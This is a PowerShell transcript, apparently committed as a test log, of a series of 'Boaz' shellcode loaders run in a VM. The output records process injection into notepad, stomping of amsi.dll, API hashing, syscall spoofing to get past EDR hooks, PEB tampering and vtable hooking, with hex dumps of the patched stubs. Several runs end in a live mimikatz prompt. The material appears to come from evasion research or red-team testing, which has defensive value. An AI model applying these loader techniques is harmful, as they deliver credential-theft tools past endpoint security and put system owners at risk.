+[+] DLL file opened successfully.
+[+] DLL loaded.
+Using DLL: C:\windows\system32\amsi.dll
+[+] Default memory protection before change in target DLL is: PAGE_EXECUTE_READ
+VirtualProtectEx failed to change memory protection. Error: 487
+PS Z:\VMshare\Virus\boaz_output> .\23_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+Starting program...
+[+] Using NtCreateThreadEx thread calling function.
+[+] Transaction Mode: Disabled
+[-] No custom DLL specified. Falling back to amsi.dll.
+[+] Using DLL: C:\windows\system32\amsi.dll
+[+] TxF Mode: Disabled
+[+] DLL file opened successfully.
+[+] DLL loaded.
+Using DLL: C:\windows\system32\amsi.dll
+[+] Default memory protection before change in target DLL is: PAGE_EXECUTE_READ
+VirtualProtectEx failed to change memory protection. Error: 487
+PS Z:\VMshare\Virus\boaz_output>
+
+PS Z:\VMshare\Virus\boaz_output> .\23_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+Starting program...
+[+] Using NtCreateThreadEx thread calling function.
+[+] Transaction Mode: Disabled
+[-] No custom DLL specified. Falling back to amsi.dll.
+[+] Using DLL: C:\windows\system32\amsi.dll
+[+] TxF Mode: Disabled
+[+] DLL file opened successfully.
+[+] DLL loaded.
+Using DLL: C:\windows\system32\amsi.dll
+[+] Default memory protection before change in target DLL is: PAGE_EXECUTE_READ
+VirtualProtectEx failed to change memory protection. Error: 487
+PS Z:\VMshare\Virus\boaz_output> Start-Transcript -Path ".\result.txt" -Append
+Transcript started, output file is .\result.txt
+PS Z:\VMshare\Virus\boaz_output> .\24_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+[-] PID not provided
+Notepad started with default settings.
+[+] notepad PID: 3488
+[+] Classic execution starts, all userland calls.
+[+] Shellcode written at address: 0000024d3c0b0000
+[+] Remote thread created successfully
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # ^D
+mimikatz #
+PS Z:\VMshare\Virus\boaz_output> .\25_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+Starting program...
+[+] Using NtCreateThreadEx thread calling function.
+[+] Transaction Mode: Disabled
+[+] LoadLibrary: 00007ffb53ddfee0
+[-] No custom DLL specified. Falling back to amsi.dll.
+[+] Using DLL: C:\windows\system32\amsi.dll
+[+] TxF Mode: Disabled
+[+] DLL file opened successfully.
+[+] DLL loaded.
+Using DLL: C:\windows\system32\amsi.dll
+[+] Default memory protection before change in target DLL is: PAGE_EXECUTE_READ
+VirtualProtectEx failed to change memory protection. Error: 487
+PS Z:\VMshare\Virus\boaz_output> .\26_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+Starting program...
+[+] Using NtCreateThreadEx thread calling function.
+[+] Transaction Mode: Disabled
+[+] APIs resolved by hash successfully.
+[+] LoadLibrary: 00007ffb53ddfee0
+[-] No custom DLL specified. Falling back to amsi.dll.
+[+] Using DLL: C:\windows\system32\amsi.dll
+[+] TxF Mode: Disabled
+[+] DLL file opened successfully.
+[+] DLL loaded.
+Using DLL: C:\windows\system32\amsi.dll
+[+] Default memory protection before change in target DLL is: PAGE_EXECUTE_READ
+VirtualProtectEx failed to change memory protection. Error: 487
+PS Z:\VMshare\Virus\boaz_output> .\28_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+[+] APIs resolved by hash successfully.
+[+] LoadLibrary: 00007ffb53ddfee0
+[+] NtAllocateVirtualMemory Not Hooked
+[+] NtProtectVirtualMemory Not Hooked
+[+] NtCreateThreadEx Not Hooked
+[+] NtWaitForSingleObject Not Hooked
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # ^D
+PS Z:\VMshare\Virus\boaz_output> .\29_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+[+] Memory allocated at: 00000212754b0000
+[+] Writing magiccode via NtWriteVirtualMemory...
+[+] Wrote 1386464 bytes to allocated memory
+[+] Creating remote thread via NtCreateThreadEx...
+[-] NtCreateThreadEx failed with NTSTATUS: 0xc0000005
+PS Z:\VMshare\Virus\boaz_output> .\30_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+[+] Memory allocated at: 000001daa7e40000
+[+] Writing magiccode via NtWriteVirtualMemory...
+[+] Wrote 1386464 bytes to allocated memory
+[+] Shellcode is located at: 000001daa7e40000
+[+] Press any key to continue...
+
+[+] Creating remote thread via NtCreateThreadEx...
+[-] NtCreateThreadEx failed with NTSTATUS: 0xc0000005
+PS Z:\VMshare\Virus\boaz_output> .\31_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+E8-C0-C5-14-00-C0
+C5-14-00-E9-DD-E2
+31-F5-E5-CE-8D-F3
+53-1A-D2-42-AB-CB
+FA-CE-71-C9-92-85
+2B-DC-C3-5D-DB-04
+C1-FB-FE-0A-8F-00
+00-00-00-4F-C9-5D
+BD-75-A0-29-9A-D2
+1D-05-A4-B7-54-F7
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # ^D
+mim
+PS Z:\VMshare\Virus\boaz_output> .\34_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+[!] EDR syscall-1 loader started.
+[+] EDR jump address: 0x0000000000000000
+[+] EDR ret address: 0x0000000000000000
+PS Z:\VMshare\Virus\boaz_output> Stop-Transcript
+Transcript stopped, output file is Z:\VMshare\Virus\boaz_output\result.txt
+PS Z:\VMshare\Virus\boaz_output>
+
+**********************
+Windows PowerShell transcript start
+Start time: 20251222082800
+Username: DESKTOP-VP8OMMK\Powell
+RunAs User: DESKTOP-VP8OMMK\Powell
+Configuration Name: 
+Machine: DESKTOP-VP8OMMK (Microsoft Windows NT 10.0.19044.0)
+Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Process ID: 3312
+PSVersion: 5.1.19041.1237
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.1237
+BuildVersion: 10.0.19041.1237
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+Transcript started, output file is C:\Users\Powell\Desktop\result_over35.txt
+PS Z:\VMshare\Virus\boaz_output> .\36_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+[!] EDR syscall-2 loader started.
+[+] Searching for syscall #2 in NtAllocateVirtualMemory @ 00007ffb559cd060
+[+] Found syscall #2 for NtAllocateVirtualMemory at 00007ffb559cd092
+[+] Syscall instruction at 00007ffb559cd092 belongs to API: NtQueryInformationProcess
+[+] Using spoofed syscall at: 00007ffb559cd092
+[+] EDR "NtAllocateVirtualMemory" address: 0x00007ffb559cd092
+[+] EDR "call rax" address: 0x0000000000000000
+[+] press any key to continue...
+
+[+] Searching for syscall #2 in NtWriteVirtualMemory @ 00007ffb559cd4a0
+[+] Found syscall #2 for NtWriteVirtualMemory at 00007ffb559cd4d2
+[+] Syscall instruction at 00007ffb559cd4d2 belongs to API: NtCloseObjectAuditAlarm
+[+] Using spoofed syscall at: 00007ffb559cd4d2
+[+] EDR "NtWriteVirtualMemory" address: 0x00007ffb559cd4d2
+[+] Searching for syscall #2 in NtCreateThreadEx @ 00007ffb559ce570
+[+] Found syscall #2 for NtCreateThreadEx at 00007ffb559ce5a2
+[+] Syscall instruction at 00007ffb559ce5a2 belongs to API: NtCreateTimer
+[+] Using spoofed syscall at: 00007ffb559ce5a2
+[+] EDR "NtCreateThreadEx" address: 0x00007ffb559ce5a2
+[+] NtAllocateVirtualMemory is not hooked.
+[+] Called *unhooked* NtAllocateVirtualMemory stub.
+[+] Memory allocated at: 0000020ceb1c0000
+[+] Writing magiccode via NtWriteVirtualMemory...
+[+] Wrote 1386464 bytes to allocated memory
+[+] Magiccode is located at: 0000020ceb1c0000
+[+] Press any key to continue...
+
+[+] Creating remote thread via NtCreateThreadEx...
+[-] NtCreateThreadEx failed with NTSTATUS: 0xc0000005
+PS Z:\VMshare\Virus\boaz_output> .\37_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+Starting Boaz custom loader...
+ [+] Enable SeDebugPrivilege adequate privilege
+ [+] Success
+[+] SeDebugPrivilege enabled.
+[+] Using NtCreateThreadEx for APC write. thread calling function.
+[+] Transaction Mode: Disabled
+[+] Hash of NtCreateThread: e0af3fde
+[+] Hash of GetProcAddress: 17eaf849
+[+] Hash of LoadLibraryW: 24b3a49d
+[+] APIs resolved by hash successfully.
+[+] LoadLibrary at: 00007ffb53ddfee0
+ by stealth module loading[-] No custom DLL specified. Falling back to amsi.dll.
+[+] Using DLL: C:\windows\system32\amsi.dll
+[+] TxF Mode: Disabled
+[+] DLL file opened successfully.
+[+] Using mapped DLL with missing PEB (NtCreateSection and NtMapViewOfSection).
+[+] fileBase: 00007ffb443c0000
+[+] DOS header: 00007ffb443c0000
+[+] NT header: 00007ffb443c00f8
+[+] Entry point RVA: 9940
+[+] DLL size: 102400 bytes
+[+] DLL entry point: 00007ffb443c9940
+[+] Default memory protection in target DLL is: PAGE_EXECUTE_READ
+[**] magiccodeSize: 1386464
+[*] dllEntryPoint: 00007ffb443c9940
+NtProtectVirtualMemory failed to change memory protection. Status: c0000018
+PS Z:\VMshare\Virus\boaz_output> .\45_boaz_mi.exe
+.\45_boaz_mi.exe : The term '.\45_boaz_mi.exe' is not recognized as the name of a cmdlet, function, script file, or 
+operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try 
+again.
+At line:1 char:1
++ .\45_boaz_mi.exe
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (.\45_boaz_mi.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+.\45_boaz_mi.exe : The term '.\45_boaz_mi.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the
+path is correct and try again.
+At line:1 char:1
++ .\45_boaz_mi.exe
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (.\45_boaz_mi.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS Z:\VMshare\Virus\boaz_output> .\47_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+Starting program...
+[+] Registered atexit function.
+[!] Program is running. Magiccode will execute on exit.
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # ^D
+m
+PS Z:\VMshare\Virus\boaz_output> TerminatingError(): "The pipeline has been stopped."
+>> TerminatingError(): "The pipeline has been stopped."
+PS Z:\VMshare\Virus\boaz_output> .\61_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+Starting Boaz custom loader...
+ [+] Enable SeDebugPrivilege adequate privilege
+ [+] Success
+[+] SeDebugPrivilege enabled.
+[+] Using NtCreateThreadEx for APC write. thread calling function.
+[+] Transaction Mode: Disabled
+[+] Hash of NtCreateThread: e0af3fde
+[+] Hash of GetProcAddress: 17eaf849
+[+] Hash of LoadLibraryW: 24b3a49d
+[+] APIs resolved by hash successfully.
+[+] LoadLibrary at: 00007ffb53ddfee0
+ by stealth phantom loading[-] No custom DLL specified. Falling back to amsi.dll.
+[+] Using DLL: C:\windows\system32\amsi.dll
+[+] TxF Mode: Disabled
+[+] DLL file opened successfully.
+[+] Using Phantom DLL with missing PEB (NtCreateSection and NtMapViewOfSection).
+[!] Before add our module to the PEB lists.
+[!] press any key to continue
+
+DLL C:\windows\system32\amsi.dll added to PEB lists
+[+] Default memory protection in target DLL is: PAGE_EXECUTE_READ
+[**] magiccodeSize: 1386464
+[*] dllEntryPoint: 00007ffb443c9940
+NtProtectVirtualMemory failed to change memory protection. Status: c0000018
+PS Z:\VMshare\Virus\boaz_output> .\73_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+[+] Starting Boaz custom loader...
+[+] Ntdll base address found: 00007ffb55930000
+[+] Located RtlUserThreadStart @ 00007ffb55982630
+[+] OS Version: Major 10, Minor 0, Build 19044
+[+] Detected Windows 10
+[+] Windows 10 detected, use mov r9, rcx
+[+] Found pattern @ 0x00007ffb55982634
+[+] Relative address is: 00000000001179b2
+[+] VT pointer is: 00007ffb55a99ff0
+[+] pointer value is: 00007ffb53dd7020
+Before Patching:
+51 52 41 50 41 51 41 52 41 53 48 B8 88 77 66 55
+44 33 22 11 48 BB 22 33 44 55 66 77 88 99 48 89
+03 50 48 83 EC 40 E8 11 00 00 00 48 83 C4 40 58
+41 5B 41 5A 41 59 41 58 5A 59 FF E0
+After Patching:
+51 52 41 50 41 51 41 52 41 53 48 B8 20 70 DD 53
+FB 7F 00 00 48 BB F0 9F A9 55 FB 7F 00 00 48 89
+03 50 48 83 EC 40 E8 11 00 00 00 48 83 C4 40 58
+41 5B 41 5A 41 59 41 58 5A 59 FF E0
+Patched Values:
+originalVtPtrValue: 0x00007FFB53DD7020
+pHookAddr: 0x00007FFB55A99FF0
+[+] Combined Shellcode Size: 1386524 bytes
+[+] Using NtCreateThreadEx for APC write. thread calling function.
+[+] Transaction Mode: Disabled
+[+] APIs resolved by hash successfully.
+[+] LoadLibrary at: 00007ffb53ddfee0
+ by stealth module loading[-] No custom DLL specified. Falling back to amsi.dll.
+[+] Using DLL: C:\windows\system32\amsi.dll
+[+] TxF Mode: Disabled
+[+] NON-MICROSOFT SIGNED DLLs BLOCKED SUCCESSFULLY.
+[*] bRemoteInjection is FALSE. Opening current process.
+[+] hProcess: ffffffffffffffff
+[+] Process ID: 6788
+[+] DLL file opened successfully.
+[+] Using mapped DLL with missing PEB (NtCreateSection and NtMapViewOfSection).
+[+] Section mapped successfully.
+[+] fileBase: 00007ffb443c0000
+[+] viewSize: 102400
+[+] press any key to continue
+
+[!] Before add our module to the PEB lists.
+[!] press any key to continue
+
+[!] press any key to continue
+
+[+] DOS header: 00007ffb443c0000
+[+] Entry point RVA: 0000000000009940
+[+] DLL size: 102400
+[+] Remote DLL entry point: 00007ffb443c9940
+[+] Default memory protection in target DLL is: PAGE_EXECUTE_READ
+[-] NtProtectVirtualMemory failed to change memory protection. Status: c0000018
+PS Z:\VMshare\Virus\boaz_output> .\74_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+[+] Starting Boaz custom loader...
+[+] Ntdll base address found: 00007ffb55930000
+[+] Located RtlUserThreadStart @ 00007ffb55982630
+[+] OS Version: Major 10, Minor 0, Build 19044
+[+] Detected Windows 10
+[+] Windows 10 detected, use mov r9, rcx
+[+] Found pattern @ 0x00007ffb55982634
+[+] Relative address is: 00000000001179b2
+[+] VT pointer is: 00007ffb55a99ff0
+[+] pointer value is: 00007ffb53dd7020
+[+] Before Patching:
+51 52 41 50 41 51 41 52 41 53 48 B8 88 77 66 55
+44 33 22 11 48 BB 22 33 44 55 66 77 88 99 48 8B
+0B 48 89 03 50 48 BA EF BE AD DE 00 00 00 00 49
+C7 C0 20 00 00 00 4C 8D 4B 16 48 83 EC 40 48 B8
+41 41 41 41 41 41 41 41 FF D0 48 83 C4 40 48 83
+EC 40 E8 11 00 00 00 48 83 C4 40 58 41 5B 41 5A
+41 59 41 58 5A 59 FF E0
+[+] After Patching:
+51 52 41 50 41 51 41 52 41 53 48 B8 20 70 DD 53
+FB 7F 00 00 48 BB F0 9F A9 55 FB 7F 00 00 48 8B
+0B 48 89 03 50 48 BA 48 28 15 00 00 00 00 00 49
+C7 C0 20 00 00 00 4C 8D 4B 16 48 83 EC 40 48 B8
+70 BC DD 53 FB 7F 00 00 FF D0 48 83 C4 40 48 83
+EC 40 E8 11 00 00 00 48 83 C4 40 58 41 5B 41 5A
+41 59 41 58 5A 59 FF E0
+[+] Patched Values:
+[+] originalVtPtrValue: 0x00007FFB53DD7020
+[+] pHookAddr: 0x00007FFB55A99FF0
+[+] magiccodeSize: 0x0000000000152848
+[+] pVirtualProtect: 0x00007FFB53DDBC70
+[+] Combined Shellcode Size: 1386568 bytes
+[+] Using NtCreateThreadEx for APC write. thread calling function.
+[+] Transaction Mode: Disabled
+[+] APIs resolved by hash successfully.
+[+] LoadLibrary at: 00007ffb53ddfee0
+ by stealth module loading[-] No custom DLL specified. Falling back to amsi.dll.
+[+] Using DLL: C:\windows\system32\amsi.dll
+[+] TxF Mode: Disabled
+[+] NON-MICROSOFT SIGNED DLLs BLOCKED SUCCESSFULLY.
+[*] bRemoteInjection is FALSE. Opening current process.
+[+] hProcess: ffffffffffffffff
+[+] Process ID: 4944
+[+] DLL file opened successfully.
+[+] Using mapped DLL with missing PEB (NtCreateSection and NtMapViewOfSection).
+[+] Section mapped successfully.
+[+] fileBase: 00007ffb443c0000
+[+] viewSize: 102400
+[!] Before add our module to the PEB lists.
+[!] press any key to continue
+
+[!] press any key to continue
+
+[+] DOS header: 00007ffb443c0000
+[+] Entry point RVA: 0000000000009940
+[+] DLL size: 102400
+[+] Remote DLL entry point: 00007ffb443c9940
+[+] Default memory protection in target DLL is: PAGE_EXECUTE_READ
+[+] WriteProcessMemory success.
+[+] Bytes written: 9920
+[+] Magic code written with APC write.
+[+] press any key to continue
+
+[-] NtProtectVirtualMemory failed to restore original memory protection. Status: c0000018
+[+] Original memory protection was: PAGE_NOACCESS (0x00000001)
+[!] Installing local hook...
+
+[+] pHookAddr is: 00007ffb55a99ff0
+[+] *(DWORD_PTR*)pHookAddr is pointed to: 00007ffb53dd7020
+[+] originalVtPtrValue is: 00007ffb53dd7020
+[+] memory scan now.
+
+[+] memory scan now. The VT Ptr has been replaced.
+
+[+] *(DWORD_PTR*)pHookAddr is now pointed to: 00007ff754006024
+Waiting... Press Enter to signal event.
+
+[^_^] VMT hooked pointer called.
+[-_-] press any key to continue
+PS Z:\VMshare\Virus\boaz_output> TerminatingError(): "The pipeline has been stopped."
+>> TerminatingError(): "The pipeline has been stopped."
+PS Z:\VMshare\Virus\boaz_output> Stop-Transcript
+**********************
+Windows PowerShell transcript end
+End time: 20251222083056
+**********************
